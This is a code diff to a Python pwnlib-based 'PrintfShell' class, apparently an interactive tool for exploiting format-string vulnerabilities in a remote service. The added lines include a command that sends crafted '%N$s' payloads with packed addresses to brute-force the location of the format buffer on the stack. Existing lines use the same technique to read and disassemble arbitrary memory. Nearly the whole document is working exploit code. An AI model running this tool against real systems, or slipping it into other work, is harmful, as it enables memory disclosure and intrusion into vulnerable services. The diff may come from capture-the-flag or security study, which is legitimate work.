@@ -14,7 +14,13 @@ class PrintfShell(shell.Shell):
         self.write = write
         self.conn = conn
         self.marker = marker
+        # Stack Offset is the first argument index. THat is
+        # printf("%{self.stack_offset}$s") will print the format string.
         self.stack_offset = None
+        # This is the location of the top of the stack
+        self.stack_base = None
+        # format location is the memory address of the start of the format string buffer
+        self.format_location = None
 
     @Command
     def raw(self, *args):
@@ -34,6 +40,8 @@ class PrintfShell(shell.Shell):
         port = int(port)
         self.conn = pwnlib.tubes.remote.remote(address, port)
         self.conn.recvuntil(self.marker)
+        self.stack_base = None
+        self.stack_offset = None
         print(self.conn)
     
     def read_response(self, string, marker=None):
@@ -67,7 +75,41 @@ class PrintfShell(shell.Shell):
     def disasm_at(self, addr : int, n : int):
         bs = self.read_bytes(addr, n)
         print(pwnlib.asm.disasm(bs,arch="amd64"))
-    
+
+    @Command
+    def set_stack_base(self, addr : int):
+        addr = int(addr, 16)
+        top_page = (addr // 4096) * 4096 + 4096
+        self.stack_base = top_page
+
+    def pad(self, s, n, pad):
+        padn = (n - len(s) % n) % n
+        pad = pad*padn
+        return s + pad
+
+    @Command
+    def find_memory_location(self):
+        if self.stack_offset is None:
+            self.stack_offset = 12 # TODO: find the actual value : find_stack_offset
+        if self.stack_base is None:
+            print("Need to set stack base") # TODO: guess actual value : guess stack base
+            return
+        watchword = pwnlib.util.packing.p64(0xdeadbeefdeadbeef)
+        start = self.stack_base
+        for i in range(0, 4096,8):
+            command = bytes(f"%{self.stack_offset+1}$s", "ascii")
+            command = self.pad(command, 8, b"\x00")
+            command += pwnlib.util.packing.p64(start - i)
+            command += watchword
+            res = self.read_response(command)
+            print(res, watchword)
+            if res == watchword + b"\n":
+                self.format_location = start - i
+                print("Found stack at", hex(self.format_location))
+                return
+        print("Not found")
+                
+
     @Command
     def read_bytes(self, addr : int, n : int):
         if self.stack_offset is None:
@@ -81,14 +123,12 @@ class PrintfShell(shell.Shell):
         all_bytes = b""
         offset = 0
         while len(all_bytes) < n:
-            #print(hex(addr+offset))
             suffix = pad + pwnlib.util.packing.p64(addr + offset)
             if b"\x0a" in suffix:
                 print(f"Cowardly refusing to look at a memory address with a 0xa in it {hex(addr+offset)}. Probably 0x0 ;)")
                 all_bytes += b"\x00"
             else:
                 res = self.read_response(command + suffix)
-                #res = res[:-len(suffix)]
                 res = res + b"\x00"
                 all_bytes += res
             offset = len(all_bytes)
